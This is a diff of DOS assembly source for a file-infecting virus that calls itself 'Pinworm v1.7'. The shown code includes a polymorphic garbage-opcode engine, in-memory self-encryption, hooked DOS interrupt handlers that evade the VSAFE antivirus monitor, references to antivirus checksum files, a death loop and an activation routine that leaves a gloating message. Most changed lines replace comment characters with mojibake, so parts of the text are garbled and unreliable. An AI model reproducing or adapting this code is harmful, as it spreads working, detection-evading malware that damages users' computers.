+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Fill Bytes Between Two Ops /w Garb.О©╫О©╫О©╫О©╫
 ;  DS:DI=First Op
 ;  DS:BP=Last Op
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 fill_between:
 	sub bp,di                       ; get difference of offsets
 	cmp bp,4                        ; if <4 then not 'nuff room
@@ -896,9 +907,9 @@ fill_between:
 not_room:
 	ret
 ENDIF
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Get sec/ms from clock ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Get sec/ms from clock О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 get_timer:
 	push ax
 	mov     ah,2ch                  ; get clock
@@ -907,12 +918,12 @@ get_timer:
 	pop ax
 	ret
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Get Random Number ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Get Random Number О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;  AX=max number
 ;  ret: DX=random #  [will not return 0]
 ;  ROUTINE PARTIALLY FROM: TP6.0 BOOK
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 random:
 	push ax
 	mov ax,ran_seed
@@ -928,17 +939,17 @@ random:
 ran_ok:
 	ret
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Associated bullshit
 ;
 chkl1   db      'CHKLIST.MS',0          ; MSAV shitty checksum
 chkl2   db      'CHKLIST.CPS',0         ; CPAV shitty checksum
-pin_dir db      255,'PIОWИrM.Шg!',0     ; DIR created
+pin_dir db      255,'PIО©╫WО©╫rM.О©╫g!',0     ; DIR created
 root    db      '..',0                  ; for changing to org. dir
 act_file db     'VIROGEN.MSG',0
 act_data db     ' Thank you for allowing Pinworm v1.7 to reside within your computer! You will',cr
          db     'be rewarded for your kindness by the gods which reign over the cyber world.',cr
-         db     'You may thank the holy god of heart and kindness, Шirogen, for bringing this',cr
+         db     'You may thank the holy god of heart and kindness, О©╫irogen, for bringing this',cr
          db     'life into the cold and dead realms of your computer.',0
 activate db     0
 isav    db      0
@@ -958,9 +969,9 @@ death_loop:
         push    ax
         jmp     death_loop      ; the neverending loop from hell
 td_end:
-; ддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Polymorphic engine data ╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Polymorphic engine data О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 inc_op_ptr dw   offset inc_buf          ; ptr to location of INC
 enc_op_ptr dw   offset enc_op_buf       ; actual ENC op ptr
 ptr_op_ptr dw   offset ptr_buf          ; ptr to ptr set pos
@@ -980,9 +991,9 @@ dec_op: dec     ax                      ; DEC AX|BX|CX|DX
 jnz_op  db      75h,0
 loop_ofs db     0
 cons_byte dw    0
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ One-byte Garbage Operands (must be 16)╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ One-byte Garbage Operands (must be 16)О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 
 nops_1:   nop
 IF INCLUDE_INT3
@@ -1010,9 +1021,9 @@ ELSE
 ENDIF
 
 IF TWO_BYTE
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Two-byte Garbage Operands (must be 16)╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Two-byte Garbage Operands (must be 16)О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 nops_2: db 0EBh,0    ; JMP $+2
 	db 74h,0     ; JZ $+2
 	db 75h,0     ; JNZ $+2
@@ -1031,9 +1042,9 @@ nops_2: db 0EBh,0    ; JMP $+2
 	xchg cx,cx
 ENDIF
 
-; ддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟╟ Activation Routine ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫ Activation Routine О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Creates directory named after Pinworm and files
 ; in that directory which together form a message.
 ;
@@ -1074,17 +1085,17 @@ r_no:
 	pop     es bp dx ds cx bx ax
 	jmp     no_act
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟ Interrupt 24h - critical error handler ╟╟╟╟╟╟╟╟╟
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫ Interrupt 24h - critical error handler О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 new_24:                                 ; critical error handler
 	mov     al,3                    ; prompts suck, return fail
 	iret
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟╟ In-memory encryption function ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫ In-memory encryption function О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;  **virus encrypted in memory up to this point**
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 mem_crypt:
 	mov     cx,offset mem_crypt-offset code_start
 	xor     di,di                   ;offset 0
@@ -1095,11 +1106,11 @@ mem_word dw     0                       ;XXXX
 	loop    mem_loop
 	ret
 
-; дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
-; ╟╟╟╟╟ Interrupt 21h ╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟╟
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
+; О©╫О©╫О©╫О©╫О©╫ Interrupt 21h О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ;  returns SI=0 and passes control to normal handler if
 ;   VSAFE uninstall command is recieved.
-; дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 new21:
 	pushf
 
@@ -1132,7 +1143,7 @@ go_now: push    ax bp bx cx di dx ds es si
 
 exe_header:
 org_bytes db    0CDh,20h,0,0            ; original COM bytes | exe hdr
-;дддд Start of heap (not written to disk)
+;О©╫О©╫О©╫О©╫ Start of heap (not written to disk)
 heap:
 db      14h     dup(0)                  ; remaining exe header space
 old_24_off dw   0                       ; old int24h vector
